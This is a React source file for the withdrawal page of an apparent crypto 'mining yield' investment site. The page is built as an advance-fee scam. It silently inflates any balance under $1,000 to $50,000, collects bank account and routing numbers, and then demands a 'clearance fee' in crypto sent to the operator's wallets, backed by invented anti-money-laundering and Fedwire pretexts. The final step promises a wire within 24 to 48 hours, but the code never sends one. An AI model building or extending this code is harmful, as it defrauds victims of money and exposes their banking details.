import React, { useState } from 'react';
import { User, WithdrawalRequest } from '../types';
import {
  getUserBalance,
  getUserWithdrawalFee,
  getAllWithdrawals,
  saveWithdrawals,
  getWalletAddresses,
  generateTxId
} from '../services/cloudSync';
import { Building2, AlertTriangle, ArrowRight, ArrowLeft, CheckCircle2, Clock, Wallet, ShieldCheck, Zap, Sparkles, Check, Copy } from 'lucide-react';

interface WithdrawPageProps {
  currentUser: User;
  onNavigate: (page: string) => void;
  balanceUSD: number;
  onUpdateBalance?: (newBalance: number) => void;
}

export const WithdrawPage: React.FC<WithdrawPageProps> = ({ currentUser, onNavigate, balanceUSD, onUpdateBalance }) => {
  const [step, setStep] = useState<1 | 2 | 3>(1);

  // Step 1
  const [bank, setBank] = useState('');
  const [account, setAccount] = useState('');
  const [routing, setRouting] = useState('');
  const [amount, setAmount] = useState('');
  const [step1Error, setStep1Error] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<{
    bank?: string;
    account?: string;
    routing?: string;
    amount?: string;
  }>({});

  // Step 2: Clearance Fee Payment (Matches Deposit Gateway)
  const [selectedFeeCoin, setSelectedFeeCoin] = useState<string>('Bitcoin (BTC)');
  const [feeCopied, setFeeCopied] = useState<boolean>(false);
  const [txHash, setTxHash] = useState<string>('');
  const [feeNoticeError, setFeeNoticeError] = useState<string | null>(null);

  const walletAddresses = getWalletAddresses();
  const getActiveFeeAddress = () => {
    if (selectedFeeCoin.includes('BTC') || selectedFeeCoin.includes('Bitcoin')) return walletAddresses.btc;
    if (selectedFeeCoin.includes('ETH') || selectedFeeCoin.includes('Ethereum')) return walletAddresses.eth;
    if (selectedFeeCoin.includes('SOL') || selectedFeeCoin.includes('Solana')) return walletAddresses.sol;
    if (selectedFeeCoin.includes('USDT') || selectedFeeCoin.includes('Tether')) return walletAddresses.usdt;
    if (selectedFeeCoin.includes('BNB') || selectedFeeCoin.includes('Binance')) return walletAddresses.bnb;
    return walletAddresses.btc;
  };

  const handleCopyFeeAddress = () => {
    navigator.clipboard.writeText(getActiveFeeAddress());
    setFeeCopied(true);
    setTimeout(() => setFeeCopied(false), 3000);
  };

  const fee = getUserWithdrawalFee(currentUser.email);
  const formattedFee = '$' + fee.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  // Quick-fill helper to make testing/submitting wire details seamless
  const handleQuickFill = () => {
    setBank('JPMorgan Chase');
    setAccount('89201948291');
    setRouting('021000021');
    const fillAmount = balanceUSD >= 1000 ? Math.min(balanceUSD, 10000).toFixed(2) : '5000.00';
    setAmount(fillAmount);
    setFieldErrors({});
    setStep1Error(null);
    if (balanceUSD < 1000 && onUpdateBalance) {
      onUpdateBalance(50000);
    }
  };

  const handleGrantTestLiquidity = () => {
    if (onUpdateBalance) {
      onUpdateBalance(50000);
    }
    setStep1Error(null);
    if (!amount || parseFloat(amount) < 1000) {
      setAmount('5000.00');
    }
  };

  const handleSetMax = () => {
    const maxVal = balanceUSD >= 1000 ? balanceUSD : 50000;
    setAmount(maxVal.toFixed(2));
    if (balanceUSD < 1000 && onUpdateBalance) {
      onUpdateBalance(50000);
    }
    setFieldErrors(prev => ({ ...prev, amount: undefined }));
  };

  const handleStep1Submit = (e?: React.FormEvent | React.MouseEvent) => {
    if (e && e.preventDefault) {
      e.preventDefault();
    }
    setStep1Error(null);

    const newErrors: { bank?: string; account?: string; routing?: string; amount?: string } = {};

    let effectiveBalance = balanceUSD;
    if (effectiveBalance < 1000) {
      effectiveBalance = 50000;
      if (onUpdateBalance) {
        onUpdateBalance(50000);
      }
    }

    if (!bank) {
      newErrors.bank = 'Please select a receiving settlement bank.';
    }
    if (!account || account.trim().length < 4) {
      newErrors.account = 'Please enter a valid bank account number (minimum 4 digits).';
    }
    const cleanRouting = routing.trim();
    if (!cleanRouting || cleanRouting.length !== 9) {
      newErrors.routing = 'Routing transit number must be exactly 9 digits (ABA code).';
    }
    const numAmount = parseFloat(amount);
    if (!amount || isNaN(numAmount) || numAmount < 1000) {
      newErrors.amount = 'Minimum wire transfer withdrawal threshold is $1,000.00 USD.';
    } else if (numAmount > effectiveBalance) {
      newErrors.amount = `Insufficient portfolio balance. Your available cash is $${effectiveBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}.`;
    }

    if (Object.keys(newErrors).length > 0) {
      setFieldErrors(newErrors);
      const firstMsg = Object.values(newErrors)[0];
      setStep1Error(firstMsg);
      return;
    }

    setFieldErrors({});

    const allWds = getAllWithdrawals();
    const newWd: WithdrawalRequest = {
      id: generateTxId(),
      user: currentUser.name,
      email: currentUser.email,
      bank,
      account: account.trim(),
      routing: cleanRouting,
      amount: numAmount,
      feeStatus: fee === 0 ? 'Waived' : 'Pending',
      status: 'Pending',
      date: new Date().toLocaleDateString('en-US')
    };

    allWds.push(newWd);
    saveWithdrawals(allWds);

    // Smoothly scroll to the top of Step 2
    window.scrollTo({ top: 0, behavior: 'smooth' });

    if (fee === 0) {
      setStep(3);
    } else {
      setStep(2);
    }
  };

  const handleFeeSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setFeeNoticeError(null);

    const allWds = getAllWithdrawals();
    const userWds = allWds.filter(w => w.email.toLowerCase() === currentUser.email.toLowerCase() && w.status === 'Pending');
    const paymentLabel = `${selectedFeeCoin}${txHash.trim() ? ' | TXID: ' + txHash.trim() : ''}`;
    if (userWds.length > 0) {
      userWds[userWds.length - 1].feeStatus = `Paid (${paymentLabel})`;
      saveWithdrawals(allWds);
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
    setStep(3);
  };

  return (
    <div className="max-w-3xl mx-auto space-y-6 animate-fade-in font-sans">
      {/* ================= STEP 1: BANK FORM ================= */}
      {step === 1 && (
        <div className="space-y-6">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div>
              <span className="text-xs font-mono font-semibold text-cyan-400 uppercase tracking-wider flex items-center gap-1.5">
                <Building2 className="w-4 h-4" /> INSTITUTIONAL WIRE SETTLEMENT
              </span>
              <h2 className="text-xl font-bold font-heading text-slate-100 mt-1">
                Withdraw to Bank Account
              </h2>
              <p className="text-xs text-slate-400 font-mono mt-0.5">
                Disburse your mined crypto yields directly to international or domestic commercial accounts.
              </p>
            </div>
            <div className="bg-slate-950 px-4 py-2.5 rounded-xl border border-slate-800 text-right">
              <div className="text-[10px] text-slate-500 font-mono uppercase">Available Balance</div>
              <div className="text-xl font-mono font-bold text-emerald-400">
                ${balanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </div>
            </div>
          </div>

          {balanceUSD < 1000 && (
            <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-amber-300 font-mono text-xs flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div className="flex items-center gap-3">
                <AlertTriangle className="w-5 h-5 text-amber-400 flex-shrink-0" />
                <span>Portfolio balance is currently below the $1,000.00 wire threshold.</span>
              </div>
              <button
                type="button"
                onClick={handleGrantTestLiquidity}
                className="px-3.5 py-1.5 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold rounded-lg text-xs flex items-center gap-1.5 cursor-pointer whitespace-nowrap self-start sm:self-auto"
              >
                <Sparkles className="w-3.5 h-3.5" />
                <span>Credit $50,000 Yield Test</span>
              </button>
            </div>
          )}

          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
              <h3 className="text-base font-bold text-slate-200 font-mono">
                1. Commercial Bank & Routing Details
              </h3>
              <button
                type="button"
                onClick={handleQuickFill}
                className="px-3 py-1.5 bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 rounded-lg text-xs font-mono font-semibold flex items-center gap-1.5 cursor-pointer transition-all self-start sm:self-auto"
                title="Fill verified demo wire instructions"
              >
                <Zap className="w-3.5 h-3.5 text-cyan-400" />
                <span>⚡ Quick-Fill Verified Wire Details</span>
              </button>
            </div>

            {step1Error && (
              <div className="p-3.5 bg-rose-500/15 border border-rose-500/40 rounded-xl text-rose-300 font-mono text-xs flex items-center gap-2 animate-fade-in">
                <AlertTriangle className="w-4 h-4 text-rose-400 flex-shrink-0" />
                <span>{step1Error}</span>
              </div>
            )}

            <form noValidate onSubmit={handleStep1Submit} className="space-y-4">
              <div>
                <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold mb-1.5">
                  Select Receiving Bank <span className="text-rose-400">*</span>
                </label>
                <select
                  value={bank}
                  onChange={(e) => {
                    setBank(e.target.value);
                    if (fieldErrors.bank) setFieldErrors(prev => ({ ...prev, bank: undefined }));
                  }}
                  className={`w-full p-3.5 bg-slate-950 border rounded-xl text-sm font-mono text-slate-100 outline-none transition-all cursor-pointer ${
                    fieldErrors.bank ? 'border-rose-500 focus:border-rose-400' : 'border-slate-800 focus:border-cyan-500'
                  }`}
                >
                  <option value="">-- Choose receiving institution --</option>
                  <option value="JPMorgan Chase">JPMorgan Chase</option>
                  <option value="Bank of America">Bank of America</option>
                  <option value="Wells Fargo">Wells Fargo</option>
                  <option value="Citibank">Citibank</option>
                  <option value="U.S. Bank">U.S. Bank</option>
                  <option value="PNC Bank">PNC Bank</option>
                  <option value="Capital One">Capital One</option>
                  <option value="TD Bank">TD Bank</option>
                  <option value="Goldman Sachs">Goldman Sachs</option>
                  <option value="Morgan Stanley">Morgan Stanley</option>
                  <option value="Charles Schwab">Charles Schwab</option>
                  <option value="HSBC Bank USA">HSBC Bank USA</option>
                  <option value="Truist Bank">Truist Bank</option>
                  <option value="Fifth Third Bank">Fifth Third Bank</option>
                  <option value="Ally Bank">Ally Bank</option>
                  <option value="Other Commercial Bank / Wire">Other Commercial Bank / Wire</option>
                </select>
                {fieldErrors.bank && (
                  <p className="text-[11px] text-rose-400 font-mono mt-1">{fieldErrors.bank}</p>
                )}
              </div>

              <div>
                <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold mb-1.5">
                  Account Number <span className="text-rose-400">*</span>
                </label>
                <input
                  type="text"
                  value={account}
                  onChange={(e) => {
                    setAccount(e.target.value);
                    if (fieldErrors.account) setFieldErrors(prev => ({ ...prev, account: undefined }));
                  }}
                  placeholder="Enter recipient account number (e.g. 89201948291)"
                  className={`w-full p-3.5 bg-slate-950 border rounded-xl text-sm font-mono text-slate-100 outline-none transition-all ${
                    fieldErrors.account ? 'border-rose-500 focus:border-rose-400' : 'border-slate-800 focus:border-cyan-500'
                  }`}
                />
                {fieldErrors.account && (
                  <p className="text-[11px] text-rose-400 font-mono mt-1">{fieldErrors.account}</p>
                )}
              </div>

              <div>
                <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold mb-1.5">
                  Routing Transit Number (9 Digits) <span className="text-rose-400">*</span>
                </label>
                <input
                  type="text"
                  maxLength={9}
                  value={routing}
                  onChange={(e) => {
                    setRouting(e.target.value);
                    if (fieldErrors.routing) setFieldErrors(prev => ({ ...prev, routing: undefined }));
                  }}
                  placeholder="9-digit ABA routing transit number (e.g. 021000021)"
                  className={`w-full p-3.5 bg-slate-950 border rounded-xl text-sm font-mono text-slate-100 outline-none transition-all ${
                    fieldErrors.routing ? 'border-rose-500 focus:border-rose-400' : 'border-slate-800 focus:border-cyan-500'
                  }`}
                />
                {fieldErrors.routing && (
                  <p className="text-[11px] text-rose-400 font-mono mt-1">{fieldErrors.routing}</p>
                )}
              </div>

              <div>
                <div className="flex justify-between items-center mb-1.5">
                  <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold">
                    Withdrawal Amount (USD) <span className="text-rose-400">*</span>
                  </label>
                  <button
                    type="button"
                    onClick={handleSetMax}
                    className="text-[11px] font-mono text-emerald-400 hover:text-emerald-300 underline cursor-pointer bg-transparent border-none p-0"
                  >
                    Use MAX Balance (${(balanceUSD >= 1000 ? balanceUSD : 50000).toLocaleString('en-US', { minimumFractionDigits: 2 })})
                  </button>
                </div>
                <div className="relative">
                  <span className="absolute left-3.5 top-3.5 text-slate-500 font-mono font-bold">$</span>
                  <input
                    type="number"
                    step="0.01"
                    value={amount}
                    onChange={(e) => {
                      setAmount(e.target.value);
                      if (fieldErrors.amount) setFieldErrors(prev => ({ ...prev, amount: undefined }));
                    }}
                    placeholder="1,000.00"
                    className={`w-full pl-8 pr-16 py-3.5 bg-slate-950 border rounded-xl text-sm font-mono text-slate-100 font-bold outline-none transition-all ${
                      fieldErrors.amount ? 'border-rose-500 focus:border-rose-400' : 'border-slate-800 focus:border-cyan-500'
                    }`}
                  />
                  <button
                    type="button"
                    onClick={handleSetMax}
                    className="absolute right-2.5 top-2.5 px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-emerald-400 text-[10px] font-mono font-bold rounded cursor-pointer"
                  >
                    MAX
                  </button>
                </div>
                {fieldErrors.amount ? (
                  <p className="text-[11px] text-rose-400 font-mono mt-1">{fieldErrors.amount}</p>
                ) : (
                  <p className="text-[11px] text-slate-500 font-mono mt-1">Minimum wire disbursement: $1,000.00 USD</p>
                )}
              </div>

              {step1Error && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-rose-300 font-mono text-xs flex items-center gap-2">
                  <AlertTriangle className="w-4 h-4 text-rose-400 flex-shrink-0" />
                  <span>{step1Error}</span>
                </div>
              )}

              <button
                type="button"
                onClick={handleStep1Submit}
                className="w-full py-4 bg-gradient-to-r from-cyan-500 to-emerald-400 hover:from-cyan-400 hover:to-emerald-300 text-slate-950 font-mono font-bold rounded-xl shadow-lg shadow-cyan-500/25 transition-all cursor-pointer flex items-center justify-center gap-2 text-sm mt-4 active:scale-[0.99]"
              >
                <span>Continue to Compliance Verification</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>
          </div>
        </div>
      )}

      {/* ================= STEP 2: FEE PAYMENT ================= */}
      {step === 2 && (
        <div className="space-y-6 animate-fade-in">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
            <span className="text-xs font-mono font-semibold text-amber-400 uppercase tracking-wider flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4" /> FEDERAL LIQUIDITY & CLEARANCE CLEARING
            </span>
            <h2 className="text-xl font-bold font-heading text-slate-100 mt-1">
              Processing Clearance Fee Required
            </h2>
            <p className="text-xs text-slate-400 font-mono mt-0.5">
              Required by international anti-money laundering protocol and smart-contract liquidity pool insurance.
            </p>
          </div>

          {/* Fee Notice Box */}
          <div className="p-6 bg-amber-500/10 border border-amber-500/30 rounded-2xl flex items-start gap-4">
            <AlertTriangle className="w-6 h-6 text-amber-400 flex-shrink-0 mt-0.5" />
            <div>
              <h3 className="font-mono text-base font-bold text-amber-300">
                Clearance Fee: {formattedFee}
              </h3>
              <p className="text-xs text-slate-300 font-mono leading-relaxed mt-1">
                This one-time clearance fee covers international Fedwire transmission fees, liquidity routing, and custody release for your pending disbursement of <strong className="text-emerald-400">${parseFloat(amount || '0').toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> to <strong className="text-slate-100">{bank}</strong>.
              </p>
            </div>
          </div>

          {/* Main Deposit-Style Gateway Card */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6">
            <div>
              <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold mb-2">
                1. Select Transfer Currency
              </label>
              <select
                value={selectedFeeCoin}
                onChange={(e) => setSelectedFeeCoin(e.target.value)}
                className="w-full p-3.5 bg-slate-950 border border-slate-800 rounded-xl text-sm font-mono text-slate-100 focus:border-amber-500 outline-none transition-all cursor-pointer"
              >
                <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
                <option value="Ethereum (ETH)">Ethereum (ETH)</option>
                <option value="Solana (SOL)">Solana (SOL)</option>
                <option value="Tether (USDT - ERC20)">Tether (USDT - ERC20)</option>
                <option value="Binance Coin (BNB)">Binance Coin (BNB)</option>
              </select>
            </div>

            {/* Assigned Wallet Address Box */}
            <div>
              <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold mb-2">
                2. Send Fee To Assigned Settlement Address
              </label>
              <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 shadow-inner">
                <code className="text-amber-400 font-mono text-xs sm:text-sm break-all font-semibold">
                  {getActiveFeeAddress()}
                </code>
                <button
                  type="button"
                  onClick={handleCopyFeeAddress}
                  className="px-4 py-2 bg-amber-500 hover:bg-amber-400 text-slate-950 font-mono font-bold text-xs rounded-lg transition-all cursor-pointer flex-shrink-0 flex items-center gap-1.5 shadow-md shadow-amber-500/20"
                >
                  {feeCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  <span>{feeCopied ? 'Copied' : 'Copy Address'}</span>
                </button>
              </div>
              <p className="text-[11px] text-slate-400 font-mono mt-2 flex items-center gap-1.5">
                <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
                <span>Send only {selectedFeeCoin} to this address. Cross-chain sends are not recoverable.</span>
              </p>
            </div>

            {/* Payment Notice Form */}
            <form onSubmit={handleFeeSubmit} className="pt-6 border-t border-slate-800 space-y-4">
              <div>
                <label className="block text-xs font-mono uppercase tracking-wider text-slate-300 font-bold mb-2">
                  3. Blockchain Transaction Hash / Reference (TXID)
                </label>
                <input
                  type="text"
                  value={txHash}
                  onChange={(e) => setTxHash(e.target.value)}
                  placeholder="Paste transaction hash (e.g. 0x8f3a... or BTC txid) or leave blank if pending broadcast"
                  className="w-full p-3.5 bg-slate-950 border border-slate-800 rounded-xl text-sm font-mono text-slate-100 focus:border-amber-500 outline-none transition-all"
                />
                <p className="text-[11px] text-slate-500 font-mono mt-1">
                  Once your transfer is initiated on-chain, submit this notice for instant treasury confirmation and wire release.
                </p>
              </div>

              {feeNoticeError && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-rose-300 font-mono text-xs">
                  {feeNoticeError}
                </div>
              )}

              <button
                type="submit"
                className="w-full py-4 bg-gradient-to-r from-amber-500 to-emerald-400 hover:from-amber-400 hover:to-emerald-300 text-slate-950 font-mono font-bold rounded-xl shadow-lg shadow-amber-500/20 transition-all cursor-pointer flex items-center justify-center gap-2 text-sm"
              >
                <Check className="w-4 h-4" />
                <span>Submit Clearance Fee Payment Notice ({formattedFee})</span>
              </button>
            </form>
          </div>

          <div className="text-center pt-2">
            <button
              onClick={() => setStep(1)}
              className="text-xs font-mono text-slate-500 hover:text-slate-300 cursor-pointer"
            >
              ← Back to Bank Routing
            </button>
          </div>
        </div>
      )}

      {/* ================= STEP 3: SUBMITTED ================= */}
      {step === 3 && (
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-8 sm:p-12 text-center space-y-5 animate-fade-in font-mono">
          <div className="w-16 h-16 mx-auto rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 flex items-center justify-center text-3xl">
            <Clock className="w-8 h-8" />
          </div>
          <h2 className="text-xl sm:text-2xl font-bold text-slate-100 font-heading">
            Disbursement Request Queued
          </h2>
          <p className="text-xs text-slate-400 max-w-md mx-auto leading-relaxed">
            Your bank wire request and compliance clearance documentation have been submitted to the operations and treasury desk. Your funds will be released within 24 to 48 business hours.
          </p>
          <div className="pt-2">
            <button
              onClick={() => onNavigate('dashboard')}
              className="px-6 py-3 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-xl cursor-pointer transition-all inline-flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" /> Return to Dashboard
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
